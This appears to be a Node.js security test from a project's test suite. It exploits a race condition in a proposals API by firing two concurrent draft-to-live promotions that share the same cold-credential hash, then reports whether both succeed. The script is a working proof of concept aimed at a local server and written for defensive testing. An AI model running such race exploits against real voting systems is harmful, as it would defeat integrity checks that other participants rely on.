/**
 * CC-COLD-001 — CC cold-credential-hash promote race (CRITICAL)
 *
 * Same shape as TX-HASH-001 (#418) but on the cc-vote2026 form. The
 * `isDuplicateCcColdCredentialHash` check in routes/api/v0/proposals.js
 * does findOne(...status: "live", ...) then proposal.save() with no DB
 * partial unique index on (voteId, metaData.coldCredentialHash). Two
 * concurrent draft -> live promotes by the same proposer with the same
 * coldCredentialHash both pass uniqueness and both persist.
 *
 * Prereqs (set as env vars or edit constants):
 *   API           - http://localhost:3001
 *   COOKIE        - the auth cookie value (jwt=...) for a proposer
 *   VOTE_ID       - ObjectId of a cc-vote2026 vote in submission window
 *   COLD_HASH     - a valid CIP-0129 cc_cold1... identifier
 *   DRAFT_A, DRAFT_B - ObjectIds of two pre-existing draft proposals owned
 *                     by the same proposer on VOTE_ID, both carrying
 *                     COLD_HASH in metaData.coldCredentialHash.
 *
 * Run:
 *   node __tests/security/atk-cc-cold-promote-race.js
 *
 * Pass criteria (vulnerable):
 *   Both PUTs return 200 and DB ends up with 2 live proposals on VOTE_ID
 *   sharing the same coldCredentialHash. (Query MongoDB to confirm.)
 *
 * Pass criteria (mitigated):
 *   At most one PUT returns 200; the other returns 400 with the
 *   "cold credential hash is already used" error tree, OR a duplicate-key
 *   error from a partial unique index.
 */
const API = process.env.API ?? "http://localhost:3001";
const COOKIE = process.env.COOKIE ?? "";
const VOTE_ID = process.env.VOTE_ID ?? "";
const COLD_HASH = process.env.COLD_HASH ?? "";
const DRAFT_A = process.env.DRAFT_A ?? "";
const DRAFT_B = process.env.DRAFT_B ?? "";

if (!COOKIE || !VOTE_ID || !COLD_HASH || !DRAFT_A || !DRAFT_B) {
  console.error("Set COOKIE, VOTE_ID, COLD_HASH, DRAFT_A, DRAFT_B env vars");
  process.exit(2);
}

function promoteBody() {
  // Caller must pre-populate each draft with a valid full cc-vote2026 metaData
  // payload; we send `status: "live"` and the same coldCredentialHash on each.
  return {
    voteId: VOTE_ID,
    status: "live",
    title: `[Wraith-2026-05-06-V2] cc-cold race`,
    summary: "cc-cold race PoC",
    metaData: {
      coldCredentialHash: COLD_HASH,
      coldCredentialType: "keyCredential",
    },
  };
}

async function promote(proposalId) {
  const t0 = Date.now();
  const res = await fetch(`${API}/api/v0/proposals/${proposalId}`, {
    method: "PUT",
    headers: { "Content-Type": "application/json", Cookie: COOKIE },
    body: JSON.stringify(promoteBody()),
  });
  const body = await res.text();
  return { id: proposalId, status: res.status, ms: Date.now() - t0, body };
}

const [a, b] = await Promise.all([promote(DRAFT_A), promote(DRAFT_B)]);
console.log(JSON.stringify({ a, b }, null, 2));

const both200 = a.status === 200 && b.status === 200;
console.log(both200 ? "VULNERABLE: both promotes succeeded" : "Mitigated or partial");
process.exit(both200 ? 0 : 1);
